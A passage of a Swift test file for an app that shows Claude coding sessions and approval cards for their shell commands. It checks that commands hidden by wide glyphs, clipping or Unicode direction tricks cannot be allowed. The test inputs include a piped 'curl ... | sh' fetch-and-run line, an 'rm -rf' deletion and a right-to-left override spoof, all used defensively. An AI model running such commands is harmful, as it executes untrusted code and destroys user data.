import BuddyKit
import Foundation
import Testing

private func session(_ id: String, _ state: SessionState) -> Session {
    Session(id: id, project: "proj", state: state, updatedAt: Date(timeIntervalSince1970: 0))
}

private func session(_ state: SessionState) -> Session { session("s1", state) }

private func approval(
    text: String = "ls", truncated: Bool = false, id: UUID = UUID(), session: String = "s1"
) -> PendingApproval {
    PendingApproval(
        id: id, sessionId: session, toolName: "Bash", toolInput: nil,
        summary: ToolSummary(text: text, isTruncated: truncated),
        createdAt: Date(timeIntervalSince1970: 0), expiresAt: Date(timeIntervalSince1970: 110))
}

private func question(session: String = "s1") -> PendingQuestion {
    PendingQuestion(
        id: UUID(), sessionId: session, agentId: nil,
        questions: [
            AskQuestion(
                text: "Which?", header: "Pick",
                options: [AskOption(label: "A", description: nil), AskOption(label: "B", description: nil)],
                multiSelect: false)
        ],
        createdAt: Date(timeIntervalSince1970: 0), expiresAt: Date(timeIntervalSince1970: 120))
}

@Suite struct IslandLogicTests {
    // MARK: Session changes

    @Test func firstSnapshotIsNeverAChange() {
        #expect(IslandLogic.sessionsChanged(previous: nil, current: [session(.working)]) == false)
    }

    @Test func stateOrActivityChangeCounts() {
        let before = [session("a", .working)]
        #expect(IslandLogic.sessionsChanged(previous: before, current: before) == false)
        #expect(IslandLogic.sessionsChanged(previous: before, current: [session("a", .waiting)]))
        var moved = session("a", .working)
        moved.activity = .thinking
        #expect(IslandLogic.sessionsChanged(previous: before, current: [moved]))
    }

    @Test func aNewSessionCountsButOnlyTimestampsAndRemovalsDoNot() {
        let a = session("a", .working)
        #expect(IslandLogic.sessionsChanged(previous: [a], current: [a, session("b", .idle)]))
        var later = a
        later.updatedAt = Date(timeIntervalSince1970: 99)
        later.toolCount = 7
        #expect(IslandLogic.sessionsChanged(previous: [a], current: [later]) == false)
        #expect(IslandLogic.sessionsChanged(previous: [a, session("b", .idle)], current: [a]) == false)
    }

    // MARK: Focus and pills

    private func dated(_ id: String, _ state: SessionState, _ seconds: TimeInterval) -> Session {
        Session(id: id, project: "p-\(id)", state: state, updatedAt: Date(timeIntervalSince1970: seconds))
    }

    @Test func theFocusedSessionIsTheChosenOneUnlessACardIsWaitingElsewhere() {
        let sessions = [dated("a", .working, 3), dated("b", .idle, 2), dated("c", .idle, 1)]
        #expect(IslandLogic.focusedSession(sessions: sessions, pending: [], questions: [], chosen: nil)?.id == "a")
        #expect(IslandLogic.focusedSession(sessions: sessions, pending: [], questions: [], chosen: "c")?.id == "c")
        let card = approval(session: "b")
        #expect(IslandLogic.focusedSession(sessions: sessions, pending: [card], questions: [], chosen: "c")?.id == "b")
        #expect(IslandLogic.focusedSession(sessions: sessions, pending: [], questions: [question(session: "c")], chosen: "a")?.id == "c")
        #expect(IslandLogic.focusedSession(sessions: [], pending: [card], questions: [], chosen: nil) == nil)
    }

    @Test func otherSessionsAreUpToFourInListOrderWithoutTheFocusedOne() {
        let sessions = (0..<7).map { dated("s\($0)", .working, Double(10 - $0)) }
        let others = IslandLogic.otherSessions(sessions, focused: "s2")
        #expect(others.map(\.id) == ["s0", "s1", "s3", "s4"])
        #expect(IslandLogic.otherSessions(Array(sessions.prefix(1)), focused: "s0").isEmpty)
        #expect(IslandLogic.otherSessions(sessions, focused: nil).count == IslandLayout.maxPills)
    }

    @Test func pillBadgesShowWhatEachSessionNeeds() {
        let waiting = dated("a", .waiting, 0)
        #expect(IslandLogic.pillBadge(for: waiting, pending: [approval(session: "a")], questions: []) == .approval)
        #expect(IslandLogic.pillBadge(for: dated("a", .working, 0), pending: [], questions: [question(session: "a")]) == .question)
        var asking = dated("a", .working, 0)
        asking.activity = .asking
        #expect(IslandLogic.pillBadge(for: asking, pending: [], questions: []) == .question)
        #expect(IslandLogic.pillBadge(for: waiting, pending: [], questions: []) == .approval)
        #expect(IslandLogic.pillBadge(for: dated("a", .finished, 0), pending: [], questions: []) == .done)
        #expect(IslandLogic.pillBadge(for: dated("a", .error, 0), pending: [], questions: []) == .failed)
        #expect(IslandLogic.pillBadge(for: dated("a", .working, 0), pending: [], questions: []) == nil)
        #expect(IslandLogic.pillBadge(for: dated("a", .idle, 0), pending: [approval(session: "b")], questions: []) == nil)
    }

    @Test func stepsAndRecentTools() {
        #expect(IslandLogic.stepsText(0) == "0 steps")
        #expect(IslandLogic.stepsText(1) == "1 step")
        #expect(IslandLogic.stepsText(12) == "12 steps")
        var s = session(.working)
        s.recentTools = ["Read", "Edit", "Bash"]
        s.toolCount = 9
        let tools = IslandLogic.recentTools(of: s)
        #expect(tools.map(\.name) == ["Read", "Edit", "Bash"])
        // Each tool keeps its place in the run, so a new one scrolls in instead of every row changing.
        #expect(tools.map(\.id) == [6, 7, 8])
        s.recentTools.append("Grep")
        s.recentTools.removeFirst()
        s.toolCount = 10
        #expect(IslandLogic.recentTools(of: s).map(\.id) == [7, 8, 9])
    }

    // MARK: The character

    @Test func theCharacterShowsTheFocusedSessionAndCardsAndDizzyWin() {
        let working = session(.working)
        func state(
            _ s: Session?, pending: [PendingApproval] = [], questions: [PendingQuestion] = [],
            quiet: TimeInterval = 0, visible: Bool = true, dizzy: Bool = false
        ) -> CharacterState {
            IslandLogic.characterState(
                focused: s, pending: pending, questions: questions, quietFor: quiet, visible: visible, dizzy: dizzy)
        }
        #expect(state(working) == .working)
        #expect(state(working, pending: [approval()]) == .approval)
        #expect(state(working, questions: [question()]) == .question)
        #expect(state(nil, pending: [approval(session: "elsewhere")]) == .approval)
        #expect(state(working, pending: [approval()], dizzy: true) == .dizzy)
        #expect(state(nil, quiet: 200) == .sleeping)
        #expect(state(nil, quiet: 200, visible: false) == .idle)
    }

    @Test func statusWords() {
        #expect(IslandLogic.statusWord(.working, pendingCount: 0) == "Working")
        #expect(IslandLogic.statusWord(.approval, pendingCount: 2) == "2 waiting")
        #expect(IslandLogic.statusWord(.finished, pendingCount: 0) == "Done")
        for state in CharacterState.allCases {
            #expect(!IslandLogic.statusWord(state, pendingCount: 0).isEmpty)
        }
    }

    // MARK: Status cards

    @Test func statusCardsFollowTheFocusedSession() {
        var failed = session(.error)
        failed.project = "buddy"
        failed.lastTool = "Bash"
        let error = IslandLogic.statusCard(focused: failed, dizzy: false, cardPending: false, dismissed: [])
        #expect(error?.kind.title == "This session stopped with an error.")
        #expect(error?.kind.detail?.contains("buddy") == true)
        let done = IslandLogic.statusCard(focused: session(.finished), dizzy: false, cardPending: false, dismissed: [])
        #expect(done?.kind.title == "Claude is done")
        #expect(IslandLogic.statusCard(focused: session(.working), dizzy: false, cardPending: false, dismissed: []) == nil)
        #expect(IslandLogic.statusCard(focused: nil, dizzy: false, cardPending: false, dismissed: []) == nil)
    }

    @Test func dizzyShowsItsCardAndAWaitingCardHidesEveryStatusCard() {
        let dizzy = IslandLogic.statusCard(focused: session(.error), dizzy: true, cardPending: false, dismissed: [])
        #expect(dizzy?.kind == .dizzy)
        #expect(dizzy?.kind.title == "Whoa, too many boops!")
        #expect(dizzy?.kind.hasOK == false)
        #expect(IslandLogic.statusCard(focused: session(.error), dizzy: true, cardPending: true, dismissed: []) == nil)
        #expect(IslandLogic.statusCard(focused: session(.finished), dizzy: false, cardPending: true, dismissed: []) == nil)
    }

    @Test func okDismissesACardUntilTheSessionChangesAgain() throws {
        let failed = session(.error)
        let card = try #require(IslandLogic.statusCard(focused: failed, dizzy: false, cardPending: false, dismissed: []))
        let key = try #require(card.key)
        #expect(card.kind.hasOK)
        #expect(IslandLogic.statusCard(focused: failed, dizzy: false, cardPending: false, dismissed: [key]) == nil)
        var later = failed
        later.updatedAt = Date(timeIntervalSince1970: 50)
        #expect(IslandLogic.statusCard(focused: later, dizzy: false, cardPending: false, dismissed: [key]) != nil)
    }

    @Test func statusCardCopy() {
        #expect(StatusCardKind.answered(where: "the terminal").title == "Answered in the terminal.")
        #expect(StatusCardKind.stillWaiting.title == "Still waiting in the terminal.")
    }

    // MARK: Questions and plans

    private func askAt(_ seconds: TimeInterval, id: UUID = UUID()) -> PendingQuestion {
        PendingQuestion(
            id: id, sessionId: "s1", agentId: nil,
            questions: [AskQuestion(
                text: "Which?", header: "Pick",
                options: [AskOption(label: "A", description: nil), AskOption(label: "B", description: nil)],
                multiSelect: false)],
            createdAt: Date(timeIntervalSince1970: seconds), expiresAt: Date(timeIntervalSince1970: seconds + 120))
    }

    private func approvalAt(_ seconds: TimeInterval, kind: ApprovalKind = .tool) -> PendingApproval {
        PendingApproval(
            id: UUID(), sessionId: "s1", toolName: "Bash", toolInput: nil,
            summary: ToolSummary(text: "ls", isTruncated: false), createdAt: Date(timeIntervalSince1970: seconds),
            expiresAt: Date(timeIntervalSince1970: seconds + 105), kind: kind)
    }

    @Test func theFrontCardIsTheOldestAcrossApprovalsAndQuestions() {
        let early = askAt(5)
        let late = approvalAt(9)
        #expect(IslandLogic.frontCard(pending: [late], questions: [early]) == .question(early))
        let first = approvalAt(1)
        #expect(IslandLogic.frontCard(pending: [first, late], questions: [early]) == .approval(first))
        // A tie goes to the approval.
        let tie = approvalAt(5)
        #expect(IslandLogic.frontCard(pending: [tie], questions: [early]) == .approval(tie))
        #expect(IslandLogic.frontCard(pending: [], questions: []) == nil)
        #expect(IslandLogic.frontCard(pending: [], questions: [early])?.id == early.id)
    }

    @Test func goWaitsForTheArmingDelayButChangePlanNeverDoes() {
        let early = shown.addingTimeInterval(0.3)
        let armed = shown.addingTimeInterval(IslandLogic.armingDelay)
        #expect(IslandLogic.planChoice(.change, shownAt: nil, now: shown) == .change)
        #expect(IslandLogic.planChoice(.change, shownAt: shown, now: shown) == .change)
        for go in [PlanChoice.acceptEdits, .askEachTime] {
            #expect(IslandLogic.planChoice(go, shownAt: nil, now: armed) == nil)
            #expect(IslandLogic.planChoice(go, shownAt: shown, now: early) == nil)
            #expect(IslandLogic.planChoice(go, shownAt: shown, now: armed) == go)
        }
    }

    /// Escape on the open island with a question in front sends it back to the terminal; anything else keeps it.
    @Test func escapeOnTheOpenIslandReleasesTheQuestionInFront() {
        let q = askAt(1)
        let escaped = IslandTransition(from: .expanded, to: .compact, escaped: true)
        #expect(IslandLogic.questionToRelease(after: escaped, front: .question(q)) == q.id)
        #expect(IslandLogic.questionToRelease(after: escaped, front: .approval(approvalAt(0))) == nil)
        #expect(IslandLogic.questionToRelease(after: escaped, front: nil) == nil)
        let fromCompact = IslandTransition(from: .compact, to: .compact, escaped: true)
        #expect(IslandLogic.questionToRelease(after: fromCompact, front: .question(q)) == nil)
        let timedOut = IslandTransition(from: .expanded, to: .compact, escaped: false)
        #expect(IslandLogic.questionToRelease(after: timedOut, front: .question(q)) == nil)
    }

    private func record(_ id: UUID, _ outcome: QuestionOutcome, at seconds: TimeInterval) -> QuestionOutcomeRecord {
        QuestionOutcomeRecord(id: id, sessionId: "s1", outcome: outcome, at: Date(timeIntervalSince1970: seconds))
    }

    @Test func aShownQuestionAnsweredOnThePhoneOrTimedOutSaysSoForAFewSeconds() {
        let phone = UUID(), expired = UUID()
        let now = Date(timeIntervalSince1970: 102)
        let answered = [record(phone, .answered(["Which?": "A"], .phone), at: 100)]
        #expect(IslandLogic.outcomeCard(answered, shown: [phone], now: now) == .answered(where: "iPhone"))
        #expect(StatusCardKind.answered(where: "iPhone").title == "Answered in iPhone.")
        let timedOut = [record(expired, .expired, at: 100)]
        #expect(IslandLogic.outcomeCard(timedOut, shown: [expired], now: now) == .stillWaiting)
        // Gone after the duration.
        let later = Date(timeIntervalSince1970: 100 + IslandLogic.outcomeCardDuration)
        #expect(IslandLogic.outcomeCard(timedOut, shown: [expired], now: later) == nil)
        // Only for a question the island showed.
        #expect(IslandLogic.outcomeCard(timedOut, shown: [], now: now) == nil)
        // The latest wins.
        #expect(IslandLogic.outcomeCard(answered + timedOut, shown: [phone, expired], now: now) == .stillWaiting)
    }

    @Test func answeredOnTheMacReleasedOrCancelledShowsNothing() {
        let id = UUID()
        let now = Date(timeIntervalSince1970: 101)
        for outcome in [QuestionOutcome.answered(["Which?": "A"], .mac), .released, .cancelled] {
            #expect(IslandLogic.outcomeCard([record(id, outcome, at: 100)], shown: [id], now: now) == nil, "\(outcome)")
        }
    }

    /// Only a question whose card the island drew counts as shown: one held in the compact island (or waiting while
    /// the screen is locked) gets no "Still waiting in the terminal." later.
    @Test func onlyAQuestionTheIslandDrewCountsAsShown() {
        let held = askAt(1), drawn = askAt(2)
        var shown = IslandLogic.shownQuestions([], drawn: nil, questions: [held, drawn], outcomes: [])
        #expect(shown.isEmpty)
        shown = IslandLogic.shownQuestions(shown, drawn: drawn.id, questions: [held, drawn], outcomes: [])
        #expect(shown == [drawn.id])
        // An approval's card (or one gone already) adds nothing.
        shown = IslandLogic.shownQuestions(shown, drawn: UUID(), questions: [held, drawn], outcomes: [])
        #expect(shown == [drawn.id])
        // Both time out: kept while their outcomes are recent, so only the drawn one says so.
        let outcomes = [record(held.id, .expired, at: 200), record(drawn.id, .expired, at: 200)]
        shown = IslandLogic.shownQuestions(shown, drawn: nil, questions: [], outcomes: outcomes)
        #expect(shown == [drawn.id])
        #expect(IslandLogic.outcomeCard(
            [record(drawn.id, .expired, at: 200)], shown: shown, now: Date(timeIntervalSince1970: 201)) == .stillWaiting)
        #expect(IslandLogic.outcomeCard(
            [record(held.id, .expired, at: 200)], shown: shown, now: Date(timeIntervalSince1970: 201)) == nil)
        // Dropped once neither waiting nor among the recent outcomes.
        #expect(IslandLogic.shownQuestions(shown, drawn: nil, questions: [], outcomes: []).isEmpty)
    }

    /// The approval card's "1/N" counts the questions waiting too.
    @Test func theQueueCountIncludesQuestions() {
        #expect(IslandLogic.queueCount(pending: [approvalAt(1)], questions: []) == 1)
        #expect(IslandLogic.queueCount(pending: [approvalAt(1)], questions: [askAt(2), askAt(3)]) == 3)
        #expect(IslandLogic.queueCount(pending: [], questions: [askAt(2)]) == 1)
    }

    /// The keyboard goes back to the app that was frontmost when the field opened; never to Buddy, and nowhere when
    /// none was recorded.
    @Test func theKeyboardGoesBackToTheAppFrontmostWhenTheFieldOpened() {
        #expect(IslandLogic.keyboardReturn(frontmost: 501, own: 77) == 501)
        #expect(IslandLogic.keyboardReturn(frontmost: 77, own: 77) == nil)
        #expect(IslandLogic.keyboardReturn(frontmost: nil, own: 77) == nil)
    }

    @Test func theOutcomeCardShowsWhenNoOtherCardWaits() {
        let card = IslandLogic.statusCard(
            focused: session(.finished), dizzy: false, cardPending: false, dismissed: [], outcome: .stillWaiting)
        #expect(card == StatusCard(kind: .stillWaiting, key: nil))
        #expect(IslandLogic.statusCard(
            focused: session(.working), dizzy: false, cardPending: true, dismissed: [], outcome: .stillWaiting) == nil)
    }

    // MARK: Sounds

    @Test func modeChangesPlayPeekOpenAndClose() {
        func cues(_ from: IslandMode, _ to: IslandMode, escaped: Bool = false) -> [SoundCue] {
            IslandLogic.cues(for: IslandTransition(from: from, to: to, escaped: escaped))
        }
        #expect(cues(.hidden, .compact) == [.peek])
        #expect(cues(.hidden, .expanded) == [.open])
        #expect(cues(.compact, .expanded) == [.open])
        #expect(cues(.expanded, .compact) == [.close])
        #expect(cues(.expanded, .hidden) == [.close])
        #expect(cues(.expanded, .compact, escaped: true) == [.close])
        #expect(cues(.compact, .hidden) == [])
        #expect(cues(.hidden, .hidden, escaped: true) == [])
    }

    @Test func directorEventsPlayTheCueOfTheSameName() {
        #expect(IslandLogic.cue(for: .boop) == .boop)
        #expect(IslandLogic.cue(for: .emote(.annoyed)) == .annoyed)
        #expect(IslandLogic.cue(for: .dizzyStarted) == .dizzy)
        #expect(IslandLogic.cue(for: .greet) == .greet)
        #expect(IslandLogic.cue(for: .emote(.love)) == .love)
        #expect(IslandLogic.cue(for: .emote(.proud)) == .proud)
        #expect(IslandLogic.cue(for: .emote(.wink)) == .wink)
        #expect(IslandLogic.cue(for: .emote(.yawn)) == .yawn)
        #expect(IslandLogic.cue(for: .emote(.happy)) == nil)
        #expect(IslandLogic.cue(for: .dizzyEnded) == nil)
    }

    @Test func theFirstSnapshotAfterLaunchPlaysNoSessionCues() {
        var cues = IslandCues()
        var running = session("a", .working)
        running.activity = .thinking
        let first = EngineSnapshot(sessions: [running, session("b", .finished)], pending: [approval()])
        #expect(cues.snapshot(first, terminalFrontmost: false) == [])
        #expect(cues.snapshot(first, terminalFrontmost: false) == [])
        // A session already running before launch shows itself through a later event: no `work`.
        var known = session("d", .working)
        known.recentTools = ["Read"]
        let later = EngineSnapshot(sessions: first.sessions + [known], pending: first.pending)
        #expect(cues.snapshot(later, terminalFrontmost: false) == [])
        // A real SessionStart is announced.
        var started = session("c", .idle)
        started.starts = 1
        let next = EngineSnapshot(sessions: later.sessions + [started], pending: first.pending)
        #expect(cues.snapshot(next, terminalFrontmost: false) == [.work])
    }

    // MARK: Focus cycling and clocks

    @Test func cyclingMovesTheFocusThroughTheList() {
        let sessions = [session("a", .working), session("b", .working), session("c", .working)]
        #expect(IslandLogic.cycledFocus(sessions: sessions, pending: [], questions: [], chosen: nil, forward: true) == "b")
        #expect(IslandLogic.cycledFocus(sessions: sessions, pending: [], questions: [], chosen: "c", forward: true) == "a")
        #expect(IslandLogic.cycledFocus(sessions: sessions, pending: [], questions: [], chosen: "a", forward: false) == "c")
    }

    /// While a card pins the focus to its session, cycling changes nothing (so it makes no sound).
    @Test func cyclingDoesNothingWhileACardHoldsTheFocus() {
        let sessions = [session("a", .working), session("b", .waiting), session("c", .working)]
        #expect(IslandLogic.cycledFocus(
            sessions: sessions, pending: [approval(session: "b")], questions: [], chosen: nil, forward: true) == nil)
        #expect(IslandLogic.cycledFocus(
            sessions: sessions, pending: [], questions: [question(session: "c")], chosen: "a", forward: false) == nil)
        #expect(IslandLogic.cycledFocus(sessions: [session("a", .working)], pending: [], questions: [], chosen: nil,
                                        forward: true) == nil)
        #expect(IslandLogic.cycledFocus(sessions: [], pending: [], questions: [], chosen: nil, forward: true) == nil)
    }

    @Test func theDirectorRunsOnlyWhileTheIslandShows() {
        #expect(IslandLogic.directorRuns(mode: .compact))
        #expect(IslandLogic.directorRuns(mode: .expanded))
        #expect(!IslandLogic.directorRuns(mode: .hidden))
    }

    @Test func sleepPlaysOnEnteringSleepingOnly() {
        var cues = IslandCues()
        #expect(cues.character(.idle) == [])
        #expect(cues.character(.sleeping) == [.sleep])
        #expect(cues.character(.sleeping) == [])
        #expect(cues.character(.working) == [])
        #expect(cues.character(.sleeping) == [.sleep])
    }

    // MARK: Card decisions

    private let shown = Date(timeIntervalSince1970: 1000)
    private var armed: Date { shown.addingTimeInterval(IslandLogic.armingDelay) }

    @Test func allowAndAlwaysBothAllowTheCurrentRequest() {
        let a = approval()
        #expect(IslandLogic.decision(for: .allow, approval: a, shownAt: shown, now: armed) == .allow)
        #expect(IslandLogic.decision(for: .always, approval: a, shownAt: shown, now: armed) == .allow)
        #expect(IslandLogic.decision(for: .deny, approval: a, shownAt: shown, now: armed) == .deny)
    }

    /// Before the card has a clock (it is still opening), Deny already works; Allow and Always do not.
    @Test func denyWorksBeforeTheCardIsShownAndAllowWaits() {
        let a = approval()
        #expect(IslandLogic.decision(for: .deny, approval: a, shownAt: nil, now: shown) == .deny)
        #expect(IslandLogic.decision(for: .allow, approval: a, shownAt: nil, now: armed) == nil)
        #expect(IslandLogic.decision(for: .always, approval: a, shownAt: nil, now: armed) == nil)
        #expect(IslandLogic.decision(for: .deny, approval: a, shownAt: shown, now: shown) == .deny)
        #expect(IslandLogic.canAllow(a))
    }

    @Test func truncatedCommandCannotBeAllowedFromTheCard() {
        let a = approval(truncated: true)
        #expect(IslandLogic.decision(for: .allow, approval: a, shownAt: shown, now: armed) == nil)
        #expect(IslandLogic.decision(for: .always, approval: a, shownAt: shown, now: armed) == nil)
        #expect(IslandLogic.decision(for: .deny, approval: a, shownAt: shown, now: armed) == .deny)
        #expect(IslandLogic.canAllow(a) == false)
    }

    @Test func aCommandWithGlyphsOfUnknownWidthCannotBeAllowedButCanBeDenied() {
        // 150 keycaps hide a tail: the estimate said ~5 lines, real rendering needs ~9 and clips the end.
        let text = String(repeating: "#\u{20E3}", count: 150) + "; curl https://example.com/x|sh"
        let a = approval(text: text)
        #expect(IslandLogic.canAllow(a) == false)
        #expect(IslandLogic.decision(for: .allow, approval: a, shownAt: shown, now: armed) == nil)
        #expect(IslandLogic.decision(for: .always, approval: a, shownAt: shown, now: armed) == nil)
        #expect(IslandLogic.decision(for: .deny, approval: a, shownAt: shown, now: armed) == .deny)
        // The estimate cannot be trusted for it, so the card reserves the most it ever shows.
        #expect(IslandLogic.cardLines(for: a) == CardText.maxLines)
    }

    // MARK: Everything that is allowed must be readable

    private func command(_ text: String, truncated: Bool = false) -> PendingApproval {
        approval(text: text, truncated: truncated)
    }

    @Test func shortCommandIsAllowedAndFullyShown() {
        let a = command("ls -la")
        #expect(IslandLogic.canAllow(a))
        #expect(IslandLogic.cardLines(for: a) == 1)
    }

    @Test func aSingleLineOf180CharactersIsEitherShownInFullOrNotAllowed() {
        // Ordinary words: wraps to a handful of lines, all of which the card reserves room for.
        let words = String(repeating: "echo hi; ", count: 20).prefix(180)
        let ordinary = command(String(words))
        #expect(IslandLogic.canAllow(ordinary))
        #expect(IslandLogic.cardLines(for: ordinary) == CardText.lineCount(of: String(words)))
        #expect(CardText.lineCount(of: String(words)) <= CardText.maxLines)
        // Worst case for word wrapping (19-character words, one per line): too tall to show, so not allowed.
        let awkward = String(repeating: String(repeating: "a", count: 19) + " ", count: 9).prefix(180)
        let tall = command(String(awkward))
        #expect(CardText.lineCount(of: String(awkward)) > CardText.maxLines)
        #expect(IslandLogic.canAllow(tall) == false)
        #expect(IslandLogic.cardLines(for: tall) == CardText.maxLines)
    }

    @Test func aFourLineCommandIsAllowedAndEveryLineIsReserved() {
        let a = command("cd /tmp\nls\necho ok\nrm -rf ~/x")
        #expect(IslandLogic.canAllow(a))
        #expect(IslandLogic.cardLines(for: a) == 4)
        #expect(IslandLogic.displayText(for: a).hasSuffix("rm -rf ~/x"))
    }

    @Test func aCommandWithMoreLinesThanTheCardShowsCannotBeAllowed() {
        let nine = (1...9).map { "echo \($0)" }.joined(separator: "\n")
        #expect(IslandLogic.canAllow(command(nine)) == false)
        let eight = (1...8).map { "echo \($0)" }.joined(separator: "\n")
        #expect(IslandLogic.canAllow(command(eight)))
        #expect(IslandLogic.cardLines(for: command(eight)) == 8)
    }

    @Test func flaggedTruncationStillBlocksAllowEvenIfTheTextFits() {
        #expect(IslandLogic.canAllow(command(String(repeating: "x", count: 200) + "…", truncated: true)) == false)
    }

    @Test func hiddenCharactersAreShownAsMarkersOnTheCard() {
        let a = command("ls \u{202E}txt.exe")
        #expect(IslandLogic.displayText(for: a) == "ls ‹U+202E›txt.exe")
        // What the engine holds is untouched.
        #expect(a.summary.text == "ls \u{202E}txt.exe")
    }

    // MARK: Arming delay

    @Test func allowAndAlwaysAreIgnoredUntilTheCardHasBeenShownForTheDelay() {
        #expect(IslandLogic.armingDelay == 0.7)
        #expect(IslandLogic.isArmed(shownAt: shown, now: shown) == false)
        #expect(IslandLogic.isArmed(shownAt: shown, now: shown.addingTimeInterval(0.699)) == false)
        #expect(IslandLogic.isArmed(shownAt: shown, now: shown.addingTimeInterval(0.7)))
        #expect(IslandLogic.isArmed(shownAt: shown, now: shown.addingTimeInterval(30)))
        // A clock that went backwards never arms.
        #expect(IslandLogic.isArmed(shownAt: shown, now: shown.addingTimeInterval(-5)) == false)

        let a = approval()
        let early = shown.addingTimeInterval(0.3)
        #expect(IslandLogic.decision(for: .allow, approval: a, shownAt: shown, now: early) == nil)
        #expect(IslandLogic.decision(for: .always, approval: a, shownAt: shown, now: early) == nil)
        #expect(IslandLogic.decision(for: .allow, approval: a, shownAt: shown, now: armed) == .allow)
    }

    @Test func denyIsNeverDelayed() {
        #expect(IslandLogic.decision(for: .deny, approval: approval(), shownAt: shown, now: shown) == .deny)
        #expect(IslandLogic.decision(for: .deny, approval: approval(truncated: true), shownAt: shown, now: shown) == .deny)
    }

    // MARK: When the arming clock runs

    @Test func theClockDoesNotRunWhileTheCardIsNotDrawn() {
        let id = UUID()
        for mode in [IslandMode.hidden, .compact] {
            #expect(IslandLogic.armingClock(front: id, mode: mode, previous: nil, now: shown) == nil)
            // A clock that was running stops when the card goes out of sight.
            let running = ArmingClock(request: id, since: shown)
            #expect(IslandLogic.armingClock(front: id, mode: mode, previous: running, now: armed) == nil)
        }
        #expect(IslandLogic.armingClock(front: nil, mode: .expanded, previous: nil, now: shown) == nil)
    }

    @Test func theClockStartsWhenTheCardIsDrawnAndKeepsRunningWhileItIs() {
        let id = UUID()
        let started = IslandLogic.armingClock(front: id, mode: .expanded, previous: nil, now: shown)
        #expect(started == ArmingClock(request: id, since: shown))
        #expect(IslandLogic.armingClock(front: id, mode: .expanded, previous: started, now: armed) == started)
    }

    @Test func theClockRestartsEachTimeTheCardIsDrawnAgain() {
        // Expanded, then collapsed by Escape, then expanded again later: the delay counts from the reopening.
        let id = UUID()
        var clock = IslandLogic.armingClock(front: id, mode: .expanded, previous: nil, now: shown)
        clock = IslandLogic.armingClock(front: id, mode: .compact, previous: clock, now: shown.addingTimeInterval(0.2))
        let reopened = shown.addingTimeInterval(5)
        clock = IslandLogic.armingClock(front: id, mode: .expanded, previous: clock, now: reopened)
        #expect(clock == ArmingClock(request: id, since: reopened))
        #expect(IslandLogic.isArmed(shownAt: reopened, now: reopened.addingTimeInterval(0.3)) == false)
    }

    @Test func aNewCardAtTheFrontRestartsTheClock() {
        let first = UUID()
        let second = UUID()
        let clock = IslandLogic.armingClock(front: first, mode: .expanded, previous: nil, now: shown)
        let later = shown.addingTimeInterval(3)
        #expect(IslandLogic.armingClock(front: second, mode: .expanded, previous: clock, now: later)
            == ArmingClock(request: second, since: later))
    }
}

@Suite struct IslandMachineTests {
    private let t0 = Date(timeIntervalSince1970: 1000)
    private func at(_ seconds: TimeInterval) -> Date { t0.addingTimeInterval(seconds) }
    /// Waiting cards' ids: an approval, then a question.
    private let card = UUID(), question = UUID()

    private func machine(_ inputs: IslandInput..., now: Date? = nil) -> IslandMachine {
        var m = IslandMachine()
        for input in inputs { m.handle(input, now: now ?? t0) }
        return m
    }

    // MARK: Opening

    @Test func startsHiddenWithNoTimer() {
        let m = IslandMachine()
        #expect(m.mode == .hidden)
        #expect(m.closesAt == nil)
    }

    @Test func hoverOpensCompactWithoutATimer() {
        var m = IslandMachine()
        let t = m.handle(.hoverBegan, now: t0)
        #expect(t == IslandTransition(from: .hidden, to: .compact, escaped: false))
        #expect(m.mode == .compact)
        #expect(m.closesAt == nil)
    }

    @Test func ordinaryEventRevealsCompactForSixtySeconds() {
        var m = IslandMachine()
        let t = m.handle(.ordinaryEvent, now: t0)
        #expect(t == IslandTransition(from: .hidden, to: .compact, escaped: false))
        #expect(m.closesAt == at(60))
    }

    @Test func ordinaryEventRearmsCompactAndLeavesExpandedAlone() {
        var m = machine(.ordinaryEvent)
        #expect(m.handle(.ordinaryEvent, now: at(30)) == nil)
        #expect(m.closesAt == at(90))
        m.handle(.click, now: at(40))
        #expect(m.handle(.ordinaryEvent, now: at(45)) == nil)
        #expect(m.mode == .expanded)
        #expect(m.closesAt == at(55))
    }

    @Test func clickExpandsFromHiddenAndCompact() {
        var hidden = IslandMachine()
        #expect(hidden.handle(.click, now: t0) == IslandTransition(from: .hidden, to: .expanded, escaped: false))
        #expect(hidden.closesAt == at(15))
        var compact = machine(.ordinaryEvent)
        #expect(compact.handle(.click, now: at(5)) == IslandTransition(from: .compact, to: .expanded, escaped: false))
        #expect(compact.closesAt == at(20))
    }

    @Test func clickOnExpandedCountsAsInteraction() {
        var m = machine(.click)
        #expect(m.handle(.click, now: at(10)) == nil)
        #expect(m.closesAt == at(25))
    }

    // MARK: Interaction and hover

    @Test func interactionResetsTheExpandedTimerAndIsIgnoredElsewhere() {
        var m = machine(.click)
        #expect(m.handle(.interaction, now: at(14)) == nil)
        #expect(m.closesAt == at(29))
        var compact = machine(.ordinaryEvent)
        #expect(compact.handle(.interaction, now: at(5)) == nil)
        #expect(compact.closesAt == at(60))
        var hidden = IslandMachine()
        #expect(hidden.handle(.interaction, now: t0) == nil)
        #expect(hidden.mode == .hidden)
        #expect(hidden.closesAt == nil)
    }

    @Test func hoverClosesAHoverOpenedCompactAfterAFewTenthsOfASecond() {
        var m = machine(.hoverBegan)
        #expect(m.handle(.hoverEnded, now: at(5)) == nil)
        #expect(m.closesAt == at(5.6))
        #expect(m.handle(.tick, now: at(5.5)) == nil)
        #expect(m.mode == .compact)
        #expect(m.handle(.tick, now: at(5.6)) == IslandTransition(from: .compact, to: .hidden, escaped: false))
        #expect(m.closesAt == nil)
    }

    @Test func hoveringAgainCancelsTheShortTimer() {
        var m = machine(.hoverBegan, .hoverEnded)
        m.handle(.hoverBegan, now: at(0.3))
        #expect(m.closesAt == nil)
        #expect(m.handle(.tick, now: at(100)) == nil)
        #expect(m.mode == .compact)
    }

    @Test func hoverOnAnEventOpenedCompactHoldsItAndLeavingRestartsTheLongTimer() {
        var m = machine(.ordinaryEvent)
        m.handle(.hoverBegan, now: at(10))
        #expect(m.mode == .compact)
        #expect(m.closesAt == nil)
        m.handle(.hoverEnded, now: at(20))
        #expect(m.closesAt == at(80))
    }

    @Test func anEventWhileHoverOpenedMakesItAnEventOpenedCompact() {
        var m = machine(.hoverBegan)
        m.handle(.ordinaryEvent, now: at(1))
        m.handle(.hoverEnded, now: at(2))
        #expect(m.closesAt == at(62))
    }

    @Test func hoveringHoldsExpandedOpen() {
        var m = machine(.click)
        m.handle(.hoverBegan, now: at(1))
        #expect(m.mode == .expanded)
        #expect(m.closesAt == nil)
        #expect(m.handle(.tick, now: at(500)) == nil)
        m.handle(.interaction, now: at(501))
        #expect(m.closesAt == nil)
        m.handle(.hoverEnded, now: at(502))
